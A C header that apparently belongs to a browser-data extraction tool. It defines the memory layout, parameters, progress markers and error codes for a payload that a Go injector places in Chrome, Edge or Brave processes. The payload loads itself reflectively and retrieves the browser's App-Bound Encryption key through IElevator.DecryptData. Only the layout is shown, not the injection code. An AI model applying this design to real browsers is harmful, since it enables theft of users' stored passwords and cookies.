#ifndef HBD_ABE_BOOTSTRAP_LAYOUT_H
#define HBD_ABE_BOOTSTRAP_LAYOUT_H

#include <stdint.h>
#include <stddef.h>

// BootstrapScratch describes the IPC contract between the C payload running
// inside the target browser process (chrome.exe, msedge.exe, brave.exe, etc.)
// and the Go injector in our own process. The injector allocates this as a
// standalone RW block in the target process and passes its address to Bootstrap.
//
// This header is deliberately free of <windows.h> so cgo -godefs can read it
// on macOS / Linux to regenerate the Go-side constants.

typedef struct __attribute__((packed)) BootstrapScratch {
    uint8_t  dos_header_prefix[0x28];  // 0x00..0x27

    uint8_t  marker;            // 0x28: Bootstrap progress marker
    uint8_t  key_status;        // 0x29: 0x01 = key ready
    uint8_t  extract_err_code;  // 0x2A: ABE_ERR_* category on failure
    uint8_t  _reserved_2b;      // 0x2B

    uint32_t hresult;           // 0x2C: COM HRESULT on failure (0 otherwise)
    uint32_t com_err;           // 0x30: IElevator.DecryptData out DWORD on failure

    uint8_t  _reserved_34[0x40 - 0x34];  // 0x34..0x3F
    uint8_t  key[32];                    // 0x40..0x5F
} BootstrapScratch;

typedef struct __attribute__((packed)) BootstrapParams {
    uintptr_t scratch_base;
    uintptr_t LoadLibraryA;
    uintptr_t GetProcAddress;
    uintptr_t VirtualAlloc;
    uintptr_t VirtualProtect;
    uintptr_t NtFlushInstructionCache;
} BootstrapParams;

// Byte offsets derived from the struct. These are the ONLY place raw numeric
// offsets appear; every C and Go consumer uses these names (or the Go-side
// constants generated from them via cgo -godefs).
#define BOOTSTRAP_MARKER_OFFSET             offsetof(struct BootstrapScratch, marker)
#define BOOTSTRAP_KEY_STATUS_OFFSET         offsetof(struct BootstrapScratch, key_status)
#define BOOTSTRAP_KEY_STATUS_READY          0x01
#define BOOTSTRAP_EXTRACT_ERR_CODE_OFFSET   offsetof(struct BootstrapScratch, extract_err_code)
#define BOOTSTRAP_HRESULT_OFFSET            offsetof(struct BootstrapScratch, hresult)
#define BOOTSTRAP_COMERR_OFFSET             offsetof(struct BootstrapScratch, com_err)
#define BOOTSTRAP_KEY_OFFSET                offsetof(struct BootstrapScratch, key)
#define BOOTSTRAP_KEY_LEN                   32

// The Go injector serializes BootstrapParams by hand, so every field offset is generated
// here too — adding or reordering a field then changes layout.go and breaks gen-layout-verify.
#define BOOTSTRAP_PARAMS_SIZE               sizeof(struct BootstrapParams)
#define BOOTSTRAP_PARAM_SCRATCH_BASE        offsetof(struct BootstrapParams, scratch_base)
#define BOOTSTRAP_PARAM_LOAD_LIBRARY_A      offsetof(struct BootstrapParams, LoadLibraryA)
#define BOOTSTRAP_PARAM_GET_PROC_ADDRESS    offsetof(struct BootstrapParams, GetProcAddress)
#define BOOTSTRAP_PARAM_VIRTUAL_ALLOC       offsetof(struct BootstrapParams, VirtualAlloc)
#define BOOTSTRAP_PARAM_VIRTUAL_PROTECT     offsetof(struct BootstrapParams, VirtualProtect)
#define BOOTSTRAP_PARAM_NT_FLUSH_IC         offsetof(struct BootstrapParams, NtFlushInstructionCache)

// Progress markers written by Bootstrap itself (enum-like, not offsets).
#define BOOTSTRAP_MARK_MZ_FOUND        0x02
#define BOOTSTRAP_MARK_IMPORTS_OK      0x05
#define BOOTSTRAP_MARK_ALLOC_OK        0x06
#define BOOTSTRAP_MARK_COPIED          0x07
#define BOOTSTRAP_MARK_RELOCATED       0x08
#define BOOTSTRAP_MARK_IMPORTS_FIXED   0x09
#define BOOTSTRAP_MARK_PERMISSIONS     0x0A
#define BOOTSTRAP_MARK_CACHE_FLUSHED   0x0B
#define BOOTSTRAP_MARK_DONE            0xFF
#define BOOTSTRAP_MARK_ERR_IMPORTS     0xE3
#define BOOTSTRAP_MARK_ERR_ALLOC       0xE4

// Failure categories written by abe_extractor.c. Complements hresult: many
// failures (env missing, unknown browser) have no COM HRESULT, so they need
// a separate category code. 0 = no error / success.
#define ABE_ERR_OK                     0x00
#define ABE_ERR_BASENAME               0x01  // GetOwnExeBasename failed
#define ABE_ERR_BROWSER_UNKNOWN        0x02  // exe not in com_iid table
#define ABE_ERR_ENV_MISSING            0x03  // HBD_ABE_ENC_B64 missing or oversized
#define ABE_ERR_BASE64                 0x04  // CryptStringToBinaryA failed
#define ABE_ERR_BSTR_ALLOC             0x05  // SysAllocStringByteLen returned NULL
#define ABE_ERR_COM_CREATE             0x06  // CoCreateInstance failed both v1 and v2
#define ABE_ERR_DECRYPT_DATA           0x07  // IElevator.DecryptData returned failure HRESULT
#define ABE_ERR_KEY_LEN                0x08  // DecryptData succeeded but wrong length

// Compile-time layout verification. Any drift here = build break.
_Static_assert(sizeof(void *) == 8, "BootstrapScratch layout assumes 64-bit");
_Static_assert(offsetof(struct BootstrapScratch, marker)           == 0x28, "marker offset");
_Static_assert(offsetof(struct BootstrapScratch, key_status)       == 0x29, "key_status offset");
_Static_assert(offsetof(struct BootstrapScratch, extract_err_code) == 0x2A, "extract_err_code offset");
_Static_assert(offsetof(struct BootstrapScratch, hresult)          == 0x2C, "hresult offset");
_Static_assert(offsetof(struct BootstrapScratch, com_err)          == 0x30, "com_err offset");
_Static_assert(offsetof(struct BootstrapScratch, key)              == 0x40, "key offset");
_Static_assert(sizeof(((struct BootstrapScratch *)0)->key)         == 32, "key length");
_Static_assert(sizeof(struct BootstrapParams)                      == 48, "bootstrap params size");

#endif // HBD_ABE_BOOTSTRAP_LAYOUT_H
